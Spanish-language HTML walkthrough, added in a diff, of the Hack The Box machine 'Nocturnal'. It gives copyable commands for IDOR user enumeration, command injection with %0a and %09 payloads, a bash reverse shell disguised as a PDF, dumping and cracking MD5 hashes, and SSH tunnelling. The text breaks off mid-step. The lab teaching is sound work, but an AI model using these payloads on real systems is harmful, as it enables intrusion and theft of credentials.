+      <h2 class="section-title">Configurar /etc/hosts</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">AGREGAR ENTRADA EN /etc/hosts</span>
+      </div>
+      <div class="prose">
+        <p>
+          El servidor nginx usa <strong>Virtual Hosting</strong>: sirve diferente contenido según el
+          valor del header <code style="color:var(--yellow);font-family:var(--font-mono)">Host</code>
+          de la petición HTTP. Si accedemos directamente por IP, nginx no reconoce qué sitio servir
+          y redirige al dominio correcto. Como <span class="hl-red">nocturnal.htb</span> no existe
+          en DNS público (es un dominio ficticio de HTB), debemos decirle manualmente a nuestro
+          sistema cómo resolverlo.
+        </p>
+        <p>
+          El archivo <span class="hl">/etc/hosts</span> es el resolver DNS local del sistema
+          operativo — se consulta antes que cualquier servidor DNS externo. Al agregar la línea
+          <code style="color:var(--yellow);font-family:var(--font-mono)">10.129.6.36 nocturnal.htb</code>,
+          cualquier petición a ese dominio va directo a la IP de la máquina sin pasar por DNS.
+          Requiere <strong>sudo</strong> porque /etc/hosts es un archivo del sistema.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nano /etc/hosts">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">HOSTS</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nano <span class="arg">/etc/hosts</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-yellow"># Agregar esta línea al final del archivo:</span></div>
+        <div><span class="o-green">10.129.6.36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="o-cyan">nocturnal.htb</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// VIRTUAL HOSTING — ¿POR QUÉ IMPORTA?</p>
+        <p>
+          Un servidor puede alojar <strong>múltiples sitios web</strong> en la misma IP usando Virtual
+          Hosting. nginx decide qué sitio mostrar leyendo el header <strong>Host</strong> de cada
+          petición HTTP. Si accedemos por IP (10.129.6.36), el header Host es la IP y nginx no
+          encuentra coincidencia con "nocturnal.htb", por eso redirige. Al configurar /etc/hosts,
+          el navegador envía <strong>Host: nocturnal.htb</strong> y nginx sirve el sitio correcto.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 03 WEB ===================== -->
+    <div class="section" id="web">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Exploración Web · Puerto 80</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">ACCEDER Y REGISTRAR USUARIO DE PRUEBA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al acceder a <span class="hl-cyan">http://nocturnal.htb</span> encontramos una aplicación
+          web llamada <strong>Nocturnal</strong>, una plataforma para subir y compartir documentos.
+          El primer paso es entender cómo funciona la aplicación desde adentro: para eso nos
+          registramos con credenciales genéricas (<span class="hl-yel">test:123</span>). No nos
+          interesa la cuenta en sí — nos interesa observar el comportamiento de la aplicación,
+          especialmente las URLs que genera y cómo referencia archivos y usuarios.
+        </p>
+        <p>
+          Al subir un archivo de prueba (<code style="color:var(--yellow);font-family:var(--font-mono)">prueba_nocturnal.odt</code>)
+          observamos que la URL para visualizarlo tiene la forma:
+          <span class="hl-red">nocturnal.htb/view.php?username=test&amp;file=prueba_nocturnal.odt</span>
+        </p>
+        <p>
+          La aplicación acepta solo tipos de archivo específicos: <strong>pdf, doc, docx, xls, xlsx, odt</strong>.
+          Cualquier otro tipo es rechazado con el mensaje "Invalid file type". Esto es relevante más
+          adelante para el bypass de subida de shell.
+        </p>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// VULNERABILIDAD DETECTADA — IDOR EN view.php</p>
+        <p>
+          El parámetro <strong>username</strong> en la URL <code>view.php?username=test&amp;file=...</code>
+          es controlado por el usuario. La aplicación no verifica que el usuario autenticado coincida
+          con el username pedido. Esto permite acceder a los archivos de <strong>cualquier otro
+          usuario</strong> simplemente cambiando el valor del parámetro. Esto se llama
+          <strong>IDOR (Insecure Direct Object Reference)</strong>.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 04 IDOR ===================== -->
+    <div class="section" id="idor">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">IDOR · Enumeración de Usuarios con wfuzz</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">EXTRAER COOKIE DE SESIÓN</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de lanzar el fuzzing, necesitamos la <strong>cookie de sesión</strong> activa del
+          usuario test. La aplicación usa PHP sessions con la cookie <span class="hl-cyan">PHPSESSID</span>.
+          Sin esta cookie, las peticiones serían redirigidas al login (HTTP 302) y no obtendríamos
+          respuestas útiles. La extraemos desde el DevTools del navegador (F12 → Application → Cookies).
+          El valor obtenido es <span class="hl-yel">6cjdvlm1gveogr1fogib0m1d6v</span>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">ENUMERAR USUARIOS CON WFUZZ</span>
+      </div>
+      <div class="prose">
+        <p>
+          <span class="hl">wfuzz</span> es un fuzzer web: reemplaza la palabra clave
+          <code style="color:var(--yellow);font-family:var(--font-mono)">FUZZ</code> en la URL
+          por cada línea de un wordlist y analiza las respuestas. Desglosando los flags:
+        </p>
+        <p>
+          <span class="hl-cyan">-c</span> activa la salida con colores, facilitando la lectura visual.
+        </p>
+        <p>
+          <span class="hl-cyan">-w /usr/share/wordlists/seclists/Usernames/Names/names.txt</span>
+          especifica el wordlist de nombres a probar. Este archivo de SecLists contiene miles de
+          nombres comunes en inglés, ideal para enumerar usernames en aplicaciones web.
+        </p>
+        <p>
+          <span class="hl-cyan">--hc=404,302</span> significa <em>hide codes</em>: oculta respuestas
+          con código HTTP 404 (archivo no encontrado) y 302 (redirección al login — usuarios no
+          existentes). Solo veremos respuestas 200, que indican un username válido que tiene archivos.
+        </p>
+        <p>
+          <span class="hl-cyan">-b "PHPSESSID=..."</span> pasa la cookie de sesión en cada petición,
+          simulando que somos el usuario <em>test</em> autenticado.
+        </p>
+        <p>
+          <span class="hl-cyan">--hh=2985</span> significa <em>hide chars</em>: oculta respuestas
+          con exactamente 2,985 caracteres. Este valor corresponde al tamaño de la página cuando
+          el archivo no existe para ese usuario ("File does not exist"). Al ocultarlo, solo vemos
+          usuarios que tienen el archivo <strong>prueba_nocturnal.odt</strong> listado — es decir,
+          usuarios reales registrados con archivos en el sistema.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd='wfuzz -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt --hc=404,302 -b "PHPSESSID=6cjdvlm1gveogr1fogib0m1d6v" --hh=2985 "http://nocturnal.htb/view.php?username=FUZZ&file=prueba_nocturnal.odt"'>
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WFUZZ</span>
+        <div><span class="prompt">$ </span><span class="cmd">wfuzz <span class="flag">-c</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/seclists/Usernames/Names/names.txt</span> <span class="flag">--hc=404,302</span> <span class="flag">-b</span> <span class="arg">"PHPSESSID=6cjdvlm1gveogr1fogib0m1d6v"</span> <span class="flag">--hh=2985</span> <span class="arg">"http://nocturnal.htb/view.php?username=FUZZ&amp;file=prueba_nocturnal.odt"</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response&nbsp; Lines&nbsp; Word&nbsp;&nbsp; Chars&nbsp;&nbsp; Payload</div>
+        <div>─────────────────────────────────────────────────────────────────────</div>
+        <div><span class="o-green">000000093:</span>&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 128 L&nbsp;&nbsp; 247 W&nbsp;&nbsp; 3037 Ch&nbsp;&nbsp; <span class="o-cyan">"admin"</span></div>
+        <div><span class="o-green">000000612:</span>&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 128 L&nbsp;&nbsp; 248 W&nbsp;&nbsp; 3113 Ch&nbsp;&nbsp; <span class="o-cyan">"amanda"</span></div>
+        <div><span class="o-green">000009880:</span>&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 120 L&nbsp;&nbsp; 247 W&nbsp;&nbsp; 3037 Ch&nbsp;&nbsp; <span class="o-cyan">"tobias"</span></div>
+        <div>&nbsp;</div>
+        <div>Total time: 220.0648 &nbsp;| Processed Requests: 10713 &nbsp;| Filtered Requests: 10710</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ USAMOS EL ARCHIVO QUE SUBIMOS COMO REFERENCIA?</p>
+        <p>
+          La técnica de wfuzz aquí es inteligente: como sabemos que <strong>nosotros</strong>
+          subimos "prueba_nocturnal.odt", un usuario inexistente o que no tiene ese archivo
+          devuelve la página de "File does not exist" con un tamaño fijo de 2,985 caracteres.
+          Al filtrar ese tamaño con <strong>--hh=2985</strong>, solo emergen los usuarios
+          <strong>reales</strong> del sistema que tienen archivos propios listados.
+          Encontramos tres: <strong>admin, amanda y tobias</strong>.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 05 CREDS ===================== -->
+    <div class="section" id="creds">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Credenciales de Amanda · IDOR Explotado</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">ACCEDER A LOS ARCHIVOS DE AMANDA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ahora que sabemos que <span class="hl-cyan">amanda</span> es un usuario real, explotamos
+          el IDOR navegando manualmente a su directorio de archivos. Simplemente cambiamos el
+          parámetro <code style="color:var(--yellow);font-family:var(--font-mono)">username=test</code>
+          por <code style="color:var(--yellow);font-family:var(--font-mono)">username=amanda</code>
+          en la URL. La aplicación nos muestra sus archivos sin validar que tengamos permiso para verlos.
+        </p>
+        <p>
+          Vemos que Amanda tiene un archivo llamado <span class="hl-red">privacy.odt</span>.
+          Cambiamos también el parámetro <code style="color:var(--yellow);font-family:var(--font-mono)">file</code>
+          para descargarlo. Al abrirlo, encontramos una carta del equipo de TI de Nocturnal con
+          una <strong>contraseña temporal</strong> asignada a Amanda.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="http://nocturnal.htb/view.php?username=amanda&file=privacy.odt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">IDOR URL</span>
+        <div><span class="prompt">URL: </span><span class="cmd">http://nocturnal.htb/view.php?<span class="flag">username=</span><span class="arg">amanda</span>&amp;<span class="flag">file=</span><span class="arg">privacy.odt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-yellow">Contenido del archivo privacy.odt:</span></div>
+        <div>&nbsp;</div>
+        <div>Dear Amanda,</div>
+        <div>Nocturnal has set the following temporary password for you: <span class="o-green">arHkG7HAI68X8s1J</span></div>
+        <div>This password has been set for all our services, so it is essential that</div>
+        <div>you change it on your first login to ensure the security of your account.</div>
+        <div>&nbsp;</div>
+        <div>Yours sincerely,</div>
+        <div>Nocturnal's IT team</div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USUARIO</div>
+          <div class="cred-val">amanda</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">CONTRASEÑA</div>
+          <div class="cred-val">arHkG7HAI68X8s1J</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">ORIGEN</div>
+          <div class="cred-val">privacy.odt (IDOR)</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 06 ADMIN ===================== -->
+    <div class="section" id="admin">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Panel de Admin · Source Code</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">LOGIN COMO AMANDA — DESCUBRIR ADMIN PANEL</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al autenticarnos con las credenciales de Amanda observamos que su dashboard tiene un
+          enlace <span class="hl-cyan">Go to Admin Panel</span> que no aparecía con el usuario test.
+          Esto confirma que Amanda tiene privilegios de administrador en la aplicación web.
+        </p>
+        <p>
+          En el código fuente de la página (CTRL+U) podemos ver que el panel admin está en
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/admin.php</code>. El
+          Admin Panel expone dos funcionalidades críticas: un <strong>File Viewer</strong> que
+          permite leer el contenido de los archivos PHP del servidor, y una función de
+          <strong>Create Backup</strong> con un campo de contraseña. Esta segunda funcionalidad
+          es donde reside la siguiente vulnerabilidad.
+        </p>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// LECTURA DE CÓDIGO FUENTE</p>
+        <p>
+          El File Viewer nos permite leer el código PHP del servidor directamente desde el navegador.
+          Al leer <strong>dashboard.php</strong>, encontramos la ruta a la base de datos SQLite:
+          <code>$db = new SQLite3('../nocturnal_database/nocturnal_database.db');</code>
+          y confirmamos que los tipos de archivo permitidos son: pdf, doc, docx, xls, xlsx, odt.
+          Esta información es vital para planear el bypass de la subida de la reverse shell.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 07 CMDINJ ===================== -->
+    <div class="section" id="cmdinj">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Command Injection · Función Backup</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">INTERCEPTAR CON BURP SUITE — ENVIAR AL REPEATER</span>
+      </div>
+      <div class="prose">
+        <p>
+          Burp Suite es un proxy de interceptación HTTP: se sienta entre nuestro navegador y el
+          servidor, capturando y permitiendo modificar cada petición antes de enviarla.
+          El <strong>Repeater</strong> de Burp es una herramienta que permite reenviar peticiones
+          HTTP manualmente con las modificaciones que queramos, sin tener que repetir la acción
+          en el navegador. Es ideal para probar inyecciones de forma iterativa.
+        </p>
+        <p>
+          Al crear un backup desde el Admin Panel, Burp captura el POST a
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/admin.php</code> con
+          el body: <code style="color:var(--yellow);font-family:var(--font-mono)">password=...&amp;backup=</code>.
+          El parámetro <strong>password</strong> se pasa a un comando del sistema operativo
+          (probablemente a <code>zip</code> con contraseña) sin ser sanitizado — aquí está la
+          inyección de comandos.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">PROBAR LA INYECCIÓN — LISTAR ARCHIVOS</span>
+      </div>
+      <div class="prose">
+        <p>
+          En sistemas Linux, el carácter <span class="hl-red">nueva línea (\n)</span> termina un
+          comando y permite iniciar otro. Al codificarlo en URL como <span class="hl-red">%0a</span>,
+          logramos que el servidor ejecute comandos adicionales después del comando original de backup.
+        </p>
+        <p>
+          El payload <span class="hl-cyan">password=%0als&amp;backup=</span> funciona así: el servidor
+          ejecuta algo como <code>zip -P &lt;password&gt; backup.zip ...</code>, pero al recibir
+          <code>%0a</code> (newline) seguido de <code>ls</code>, el shell interpreta que es un
+          nuevo comando. El resultado de <code>ls</code> se devuelve en la respuesta HTTP, confirmando
+          la inyección.
+        </p>
+        <p>
+          Para listar con detalle el contenido de <code>uploads/</code> usamos:
+          <span class="hl-cyan">password=%0als%09-l%09uploads&amp;backup=</span>
+          donde <span class="hl-yel">%09</span> es el tabulador en URL-encoding (equivale al
+          espacio, pero los espacios a veces se filtran en el campo password). Confirmamos que
+          el archivo <strong>shell.pdf</strong> está en el directorio uploads.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="password=%0als&backup=">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">CMD INJECTION</span>
+        <div><span class="prompt">[Burp Repeater] POST body: </span><span class="cmd">password=<span class="flag">%0a</span><span class="arg">ls</span>&amp;backup=</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="password=%0als%09-l%09uploads&backup=">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LISTAR UPLOADS</span>
+        <div><span class="prompt">[Burp Repeater] POST body: </span><span class="cmd">password=<span class="flag">%0a</span><span class="arg">ls</span><span class="flag">%09</span><span class="arg">-l</span><span class="flag">%09</span><span class="arg">uploads</span>&amp;backup=</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// ¿POR QUÉ %0a Y %09?</p>
+        <p>
+          <strong>%0a</strong> es el caracter de nueva línea (LF, ASCII 10) en URL-encoding. En un
+          shell Unix, la nueva línea separa comandos — permite inyectar un segundo comando.
+          <strong>%09</strong> es el tabulador (ASCII 9), que bash acepta como separador de argumentos
+          igual que el espacio. Se usa en lugar del espacio (%20) porque algunos filtros rechazan
+          espacios en campos de contraseña pero permiten tabuladores. Esta técnica de evasión de
+          filtros usando caracteres alternativos de separación es estándar en CTFs.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 08 SHELL ===================== -->
+    <div class="section" id="shell">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Reverse Shell · Acceso Inicial</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">CREAR Y SUBIR LA REVERSE SHELL</span>
+      </div>
+      <div class="prose">
+        <p>
+          La aplicación solo acepta archivos con extensiones <strong>pdf, doc, docx, xls, xlsx, odt</strong>,
+          pero el servidor no verifica el contenido real del archivo, solo la extensión. Aprovechamos
+          esto creando un script bash con extensión <span class="hl-red">.pdf</span>: el servidor
+          lo acepta creyendo que es un PDF, pero en realidad es código bash ejecutable.
+        </p>
+        <p>
+          El contenido del "PDF" es una <strong>reverse shell bash</strong>:
+          <code style="color:var(--yellow);font-family:var(--font-mono)">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.5/443 0&gt;&amp;1'</code>.
+          Desglosando: <span class="hl-cyan">bash -i</span> abre una shell interactiva.
+          <span class="hl-cyan">&gt;&amp; /dev/tcp/IP/PUERTO</span> redirige tanto stdout como stderr
+          hacia una conexión TCP a nuestra IP en el puerto 443. <span class="hl-cyan">0&gt;&amp;1</span>
+          redirige también stdin, completando el canal bidireccional. El resultado: cuando el servidor
+          ejecuta este script, bash abre una conexión de vuelta a nuestra máquina y nosotros recibimos
+          una shell interactiva del servidor.
+        </p>
+        <p>
+          El puerto <strong>443</strong> se usa estratégicamente: es el puerto estándar de HTTPS
+          y raramente está bloqueado por firewalls. Hay que tener el listener activo antes de
+          ejecutar la shell.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nano shell.pdf">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">CREAR SHELL</span>
+        <div><span class="prompt">$ </span><span class="cmd">nano <span class="arg">shell.pdf</span></span></div>
+        <div><span class="comment">#!/bin/bash</span></div>
+        <div><span class="cmd">bash <span class="flag">-c</span> <span class="arg">'bash -i &gt;&amp; /dev/tcp/10.10.16.5/443 0&gt;&amp;1'</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">ABRIR LISTENER Y EJECUTAR LA SHELL</span>
+      </div>
+      <div class="prose">
+        <p>
+          <span class="hl">nc -lvnp 443</span> inicia <strong>netcat</strong> en modo escucha:
+          <span class="hl-cyan">-l</span> = listen, <span class="hl-cyan">-v</span> = verbose,
+          <span class="hl-cyan">-n</span> = no resolución DNS, <span class="hl-cyan">-p 443</span>
+          = puerto. Netcat espera una conexión entrante y cuando llega, la conecta a nuestra terminal.
+        </p>
+        <p>
+          Con el listener activo, inyectamos el comando para ejecutar la shell desde Burp:
+          <span class="hl-cyan">password=%0abash%09uploads/shell.pdf&amp;backup=</span>.
+          El servidor ejecuta <code>bash uploads/shell.pdf</code>, que activa la reverse shell hacia
+          nuestro listener. Obtenemos acceso como <span class="hl-red">www-data</span> — el usuario
+          bajo el cual corre el servidor web nginx/PHP.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nc -lvnp 443">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LISTENER</span>
+        <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="password=%0abash%09uploads/shell.pdf&backup=">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">TRIGGER SHELL</span>
+        <div><span class="prompt">[Burp Repeater] POST body: </span><span class="cmd">password=<span class="flag">%0a</span><span class="arg">bash</span><span class="flag">%09</span><span class="arg">uploads/shell.pdf</span>&amp;backup=</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">listening on [any] 443 ...</span></div>
+        <div>connect to [10.10.16.5] from (UNKNOWN) [10.129.6.36] 46520</div>
+        <div>bash: cannot set terminal process group (1005): Inappropriate ioctl for device</div>
+        <div>bash: no job control in this shell</div>
+        <div><span class="o-cyan">www-data@nocturnal:~/nocturnal.htb$</span> whoami</div>
+        <div><span class="o-green">www-data</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 09 DB ===================== -->
+    <div class="section" id="db">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">SQLite · Extracción de Hashes</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">ACCEDER A LA BASE DE DATOS SQLite</span>
+      </div>
+      <div class="prose">
+        <p>
+          Desde el código fuente leído en el Admin Panel sabemos que la base de datos está en
+          <span class="hl-cyan">../nocturnal_database/nocturnal_database.db</span> relativo al
+          directorio web. Como <span class="hl-yel">www-data</span> tenemos permisos de lectura
+          sobre ese archivo. <span class="hl">sqlite3</span> es el cliente de línea de comandos
+          para bases de datos SQLite.
+        </p>
+        <p>
+          Con <span class="hl-cyan">.tables</span> listamos las tablas disponibles. Encontramos
+          <strong>users</strong> y <strong>uploads</strong>. La consulta
+          <span class="hl-cyan">select * from users;</span> nos devuelve todos los registros,
+          incluyendo los <strong>hashes MD5</strong> de las contraseñas de todos los usuarios.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlite3 ../nocturnal_database/nocturnal_database.db">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLITE</span>
+        <div><span class="prompt">www-data$ </span><span class="cmd">sqlite3 <span class="arg">../nocturnal_database/nocturnal_database.db</span></span></div>
+        <div><span class="prompt">sqlite3&gt; </span><span class="cmd">.tables</span></div>
+        <div><span class="prompt">sqlite3&gt; </span><span class="cmd">select <span class="flag">*</span> from <span class="arg">users</span>;</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>uploads&nbsp;&nbsp; users</div>
+        <div>&nbsp;</div>
+        <div>1|<span class="o-cyan">admin</span>|<span class="o-yellow">d725aeba143f575736b07e045d8ceebb</span></div>
+        <div>2|<span class="o-cyan">amanda</span>|<span class="o-yellow">df8b20aa0c935023f99ea58358fb63c4</span></div>
+        <div>4|<span class="o-cyan">tobias</span>|<span class="o-red">55c82b1ccd55ab219b3b109b07d5061d</span></div>
+        <div>6|<span class="o-cyan">kavi</span>|<span class="o-yellow">f38cde1654b39fea2bd4f72f1ae4cdda</span></div>
+        <div>7|<span class="o-cyan">e0Al5</span>|<span class="o-yellow">101ad4543a96a7fd84908fd0d802e7db</span></div>
+        <div>8|<span class="o-cyan">test</span>|<span class="o-yellow">202cb962ac59075b964b07152d234b70</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">15</div>
+        <span class="step-title">CRACKEAR EL HASH DE TOBIAS CON CRACKSTATION</span>
+      </div>
+      <div class="prose">
+        <p>
+          Las contraseñas están hasheadas con <strong>MD5</strong> (sin salt — hash de longitud
+          32 caracteres hexadecimales). MD5 es un algoritmo de hash antiguo y roto: existen bases
+          de datos de miles de millones de hashes precomputados llamadas <strong>rainbow tables</strong>.
+          <span class="hl-cyan">CrackStation.net</span> es una de las más completas y gratuitas.
+        </p>
+        <p>
+          El hash de <span class="hl-yel">tobias</span> es
+          <code style="color:var(--yellow);font-family:var(--font-mono)">55c82b1ccd55ab219b3b109b07d5061d</code>.
+          Al buscarlo en CrackStation obtenemos la contraseña en texto plano:
+          <span class="hl-green" style="color:var(--green)">slowmotionapocalypse</span>.
+          Nos enfocamos en tobias porque al revisar <code>/etc/passwd</code> confirmamos que es el
+          único usuario del sistema con shell bash (<code>tobias:x:1000:1000:tobias:/home/tobias:/bin/bash</code>)
+          además de root.
+        </p>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USUARIO</div>
+          <div class="cred-val">tobias</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">CONTRASEÑA</div>
+          <div class="cred-val">slowmotionapocalypse</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">HASH MD5</div>
+          <div class="cred-val" style="font-size:0.72rem; color:var(--text-dim)">55c82b1ccd55ab219b3b109b07d5061d</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 10 SSH ===================== -->
+    <div class="section" id="ssh">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">SSH · Acceso como Tobias</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">16</div>
+        <span class="step-title">SSH COMO TOBIAS — USER FLAG</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con las credenciales obtenidas nos conectamos por SSH al puerto 22. SSH (Secure Shell)
+          nos da una shell completamente interactiva, mucho más estable y funcional que la reverse
+          shell de netcat. En el home de tobias encontramos el archivo
+          <span class="hl-green" style="color:var(--green)">user.txt</span> con la primera flag.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh tobias@10.129.6.36">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">tobias@10.129.6.36</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">tobias@nocturnal:~$</span> cat user.txt</div>
+        <div><span class="o-green">0508ebedaf704526abea7844cbfe9aaa</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">17</div>
+        <span class="step-title">ENUMERACIÓN POST-EXPLOTACIÓN — PUERTOS INTERNOS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Como tobias, buscamos servicios que estén corriendo internamente pero no expuestos
+          externamente. <span class="hl">netstat -tlnp</span> muestra conexiones TCP en escucha:
+          <span class="hl-cyan">-t</span> = TCP, <span class="hl-cyan">-l</span> = solo listening,
+          <span class="hl-cyan">-n</span> = sin resolución de nombres, <span class="hl-cyan">-p</span>
+          = mostrar el proceso (aunque como no somos root no veremos todos los PIDs).
+        </p>
+        <p>
+          Encontramos el puerto <span class="hl-red">8080</span> escuchando únicamente en
+          <code style="color:var(--yellow);font-family:var(--font-mono)">127.0.0.1</code>
+          (localhost). Esto significa que hay un servicio web accesible solo desde el propio
+          servidor, no desde el exterior. Para acceder a él desde nuestra máquina atacante
+          necesitamos hacer un <strong>SSH Port Forwarding</strong>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="netstat -tlnp | grep LISTEN">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NETSTAT</span>
+        <div><span class="prompt">tobias@nocturnal:~$ </span><span class="cmd">netstat <span class="flag">-tlnp</span> | grep <span class="arg">LISTEN</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>tcp&nbsp; 0&nbsp; 0&nbsp; 0.0.0.0:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp; LISTEN&nbsp; -</div>
+        <div>tcp&nbsp; 0&nbsp; 0&nbsp; <span class="o-red">127.0.0.1:8080</span>&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp; LISTEN&nbsp; -</div>
+        <div>tcp&nbsp; 0&nbsp; 0&nbsp; 127.0.0.1:53:53&nbsp;&nbsp; 0.0.0.0:*&nbsp; LISTEN&nbsp; -</div>
+        <div>tcp&nbsp; 0&nbsp; 0&nbsp; 0.0.0.0:22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp; LISTEN&nbsp; -</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 11 TUNNEL ===================== -->
+    <div class="section" id="tunnel">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">SSH Local Port Forwarding</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">18</div>
+        <span class="step-title">TUNELIZAR EL PUERTO 8080 A TRAVÉS DE SSH</span>
+      </div>
+      <div class="prose">
+        <p>
+          El <strong>SSH Local Port Forwarding</strong> (flag <span class="hl-cyan">-L</span>) crea
+          un túnel encriptado: redirige el tráfico de un puerto local de nuestra máquina a través
+          de la conexión SSH hacia un puerto de la máquina remota.
+        </p>
+        <p>
+          El formato es <code style="color:var(--yellow);font-family:var(--font-mono)">-L puerto_local:host_remoto:puerto_remoto</code>.
+          En nuestro caso: <span class="hl-cyan">-L 9000:127.0.0.1:8080</span> significa "mapea
